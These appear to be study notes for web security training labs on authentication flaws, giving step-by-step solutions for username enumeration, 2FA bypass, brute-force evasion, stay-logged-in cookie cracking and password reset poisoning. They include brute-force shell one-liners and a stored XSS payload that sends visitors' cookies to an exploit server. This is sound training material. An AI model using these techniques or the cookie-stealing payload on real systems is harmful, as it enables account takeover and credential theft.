# Username enumeration via different responses
1. Test login
2. HTTP response says "invalid username"
3. Use Intruder and Grep - Extract to brute-force usernames and identify HTTP response which says "invalid password"
4. User Intruder and Grep - Extract to brute-force password associated with valid username and identify response indicating valid credential pair
# 2FA simple bypass
1. Login with valid credentials at URL: `/login`
2. Directed to URL: `/login2` for 2FA code
3. Force browser to `/my-account?id=carlos` to skip 2FA completely
# Password reset broken logic
1. Login page has reset password function
2. Reset password for account you have access to (Wiener)
3. Intercept request when submitting password reset and identify `username` parameter
4. Change `username` parameter to be `Carlos`
5. Login as Carlos
# Username enumeration via subtly different responses
1. Login page returns error message "Invalid username of password."
2. Fuzz username and Grep - Extract the exact phrase above
3. Read the results and see that one of the usernames returns the same error message except with the period missing
	1. This is the valid username
# Username enumeration via response timing
1. Generate large password e.g. 200 chars
```python
print("A"*200)
```
2. Send POST to `/login` with known valid username and see response time is very long
3. Send POST to `/login` with known invalid username and see response time is short
4. Construct Intruder **pitchfork** attack because you need to provide a header `X-Forwarded-For` to bypass IP based rate limiting on your login attempts
# Broken brute-force protection, IP block
1. Test how many failed login attempts cause an IP block (this case 3 failed login attempts)
2. Construct a wordlist using the POST body (use bash)
```sh
for i in $(cat passwords.txt); do echo "username=carlos&password=$i"; done > carlosBrute.txt
```
3. Use this [python script](https://raw.githubusercontent.com/MINEGOBLIN/BSCP/refs/heads/main/Authentication/brokenBruteForceProtectionIpBlock.py) to insert the valid login on every third row
4. Set up Burp Intruder to start with a valid login attempt and use the wordlist generated from the Python script
5. Configure the resource pool to make `1` request at a time and wait `100` milliseconds between each request
6. Review results for `302 Redirect` for the request using `Carlos` as the username
# Username enumeration via account lock
1. Send POST to `/login` with username list and a password list that has `4` passwords to make `4` failed login attempts
2. Use Grep - Extract to extract "Invalid username of password combination."
3. Analyse results and identify username that receives error message "Account locked..."
4. Brute force single username with entire password list using the same Grep - Extract above
5. Analyse results and identify username and password combination that does not receive any error message
6. After the `1` minute account lockout proceed to login with the credential pair identified in step `5`
# 2FA broken logic
1. Intercept POST request to `/login` with valid credential pair
2. Modify `verify` cookie to equal the value of target account `carlos`
3. Confirm no MFA code was generated and sent to `wiener` email and you are successfully at `/login2` (the second step in MFA)
4. Intercept request to submit MFA code
	1. Confirm cookie is `verify=carlos`
5. Fuzz MFA code with ffuf
```sh
ffuf -request mfabrute.req -w <(seq -w 1 9999) -mc 302
```
6. After identifying valid code, edit intercepted request to the valid code
# Brute-forcing a stay-logged-in cookie
1. Intercept POST request to `/login` with "stay logged in" checkbox selected
2. Identify `stay-logged-in` cookie is generated
3. Selecting cookie shows it is base64 encoded with in the format `wiener:hash_sum`
4. Repeat login attempt and base64 value stays the same so we know this cookie is static
5. Looks like a hash sum, test if it is `md5`
```sh
echo -n "peter" | md5sum
```
- Matches indicating the "stay logged in" cookie is the username and `md5` sum of the user's password
6. To brute force this "stay logged in" cookie create a wordlist that is the `md5` sum of candidate passwords
```sh
for i in $(cat passwords.txt); do echo -n "$i" | md5sum | awk '{print $1}' ; done > passwordsMD5.txt
```
7. Create a wordlist that is `username:passMD5sum`
```sh
for i in $(cat passwordsMD5.txt); do echo -n "carlos:$i\n"; done > carlosMD5Passwords.txt
```
8. Capture a request to `/my-account` with the `stay-logged-in` cookie present > Send to Intruder
9. Paste payload list from `carlosMD5Passwords.txt`
```sh
xclip -selection c < carlosMD5Passwords.txt
```
10. Disable URL encoding of the payload
11. Add "Payload processing" rule to Base64-encode the payload
12. Analyse results and find `200 OK` response indicating successful login
# Offline password cracking
1. Identify no filter done on comments allowing XSS to be performed
2. Static cookie `stay-logged-in` is identified when logging in and is comprised of the username and `md5` hash of the user's password
3. Submit a comment that will make anyone visiting the page send their session cookies to our server
```html
<script>var i=new Image; i.src="https://exploit-0a2000130407e1b580832a230159000a.exploit-server.net/log/?"+document.cookie;</script>
```
4. After victims visits blog post they'll send their `stay-logged-in` cookie to us
5. Base64 decode the cookie and take `md5` sum
6. Use on https://crackstation.net/ or use wordlist of md5sums
7. After getting password, authenticate using victim's credentials
# Password reset poisoning via middleware
1. Reset password sends a link via email to our account
	1. Password reset is a GET request with unique token parameter to reset password
2. Capture POST request to reset password
3. While still resetting password for Wiener's account > Inject Host override headers pointing to exploit server and inspect the links sent via email to see if generate a link pointing to your exploit server
4. Confirm `X-Forwarded-Host` header dynamically changes password reset link and makes the link go to exploit server
5. Confirm clicking reset password link leaks password reset token in exploit server logs
6. Reset Carlos's password
7. Check exploit logs
8. Steal token > Reset password
# Password brute-force via password change
1. Capture POST request to change password
2. Changing username parameter to Carlos returns `302` redirect to login page when both "New password" parameters match
3. Submitting request with "New password" parameters not matching returns `200 OK` and "New passwords do not match" in the HTTP response
4. Use the request with non-matching new password parameters in intruder to brute-force the password
5. Configure Grep - Extract to extract the warning message and identify the request returning "New passwords do not match" indicating the supplied old password was correct
6. Authenticate as Carlos using identified password